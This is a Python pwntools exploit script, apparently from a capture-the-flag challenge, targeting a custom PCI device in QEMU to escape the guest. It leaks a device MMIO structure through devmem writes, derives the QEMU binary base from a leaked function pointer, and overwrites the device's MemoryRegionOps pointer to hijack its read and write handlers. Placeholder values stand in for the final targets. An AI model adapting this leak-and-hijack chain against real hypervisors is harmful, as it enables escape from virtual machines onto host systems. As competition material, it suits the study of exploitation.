# this was the exploit of my teammate @Aali before he went to sleep and fully handed off the challange to me.
# thx a lot to him for explaining how to interact with the PCI, and showing me how to pwn it a bit
from pwn import *

context.binary = elf = ELF("share/qemu-system-x86_64")

io = remote("35.221.156.78", 30002)
#io = remote("172.18.0.2", 30002)

io.readuntil(b"/root #")

print("Got prompt")

# leak mmio struct to guest mem
io.sendline(b"devmem 0xfebd0008 32 0xF8")
io.sendline(b"devmem 0xfebd0008")
io.sendline(b"devmem 0xfebd0004 32 0x00030000")
io.sendline(b"devmem 0xfebd0004")
io.sendline(b"devmem 0xfebd0000")

# read mmio struct from guest mem
for i in range(64):
  io.sendline(b"devmem " + hex(0x00031f00 + i * 4).encode())

io.readuntil(b"devmem 0x31f00\r\n")

data = b""

for i in range(64):
  data += int(io.readline(), 16).to_bytes(4, 'little')
  
  if i < 63:
    io.readline()

maria = int.from_bytes(data[0x58:0x60], 'little')

# we can write this area from guest mem
controlled = maria + 0xa30 + 0xf8

leak = int.from_bytes(data[0x90:0x98], 'little') - elf.symbols['memory_region_destructor_none']

print("Leak: " + hex(leak))

# read/write function pointers
ops_ptr = controlled

# first argument passed to read/write functions
opaque = 0xdeadbeef

io.sendline(b"devmem 0x00031f50 64 " + hex(ops_ptr).encode())
io.sendline(b"devmem 0x00031f58 64 " + hex(opaque).encode())

new_read = 0x1337
new_write = 0x1337

io.sendline(b"devmem 0x000300F8 64" + hex(new_read).encode())
io.sendline(b"devmem 0x00030100 64" + hex(new_write).encode())

# overwrite mmio struct
io.sendline(b"devmem 0xfebd0000 32 0")

# trigger read function
io.sendline(b"devmem 0xfebd0000")

print("Payload sent, exiting")

io.sendline(b"exit")

print(io.readall())

io.interactive()
